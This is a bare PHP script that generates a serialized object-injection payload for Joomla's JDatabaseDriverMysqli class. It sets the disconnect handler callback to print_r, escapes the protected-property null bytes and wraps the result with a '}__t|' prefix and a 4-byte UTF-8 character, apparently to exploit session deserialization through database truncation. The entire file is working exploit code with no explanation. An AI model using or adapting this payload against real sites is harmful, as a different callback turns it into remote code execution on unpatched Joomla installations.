<?
header("Content-Type: text/plain");
  
class JDatabaseDriverMysqli {
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->connection = 1;
        $this->disconnectHandlers = array("print_r");
    }
}
  
$a = new JDatabaseDriverMysqli();
$result = serialize($a);
//$result = str_replace(chr(0).'*'.chr(0), '\x5C0\x5C0\x5C0', $result);
$result = str_replace(chr(0).'*'.chr(0), '\0\0\0', $result);
echo '}__t|'.$result.'\xF0\x9D\x8C\x86';
?>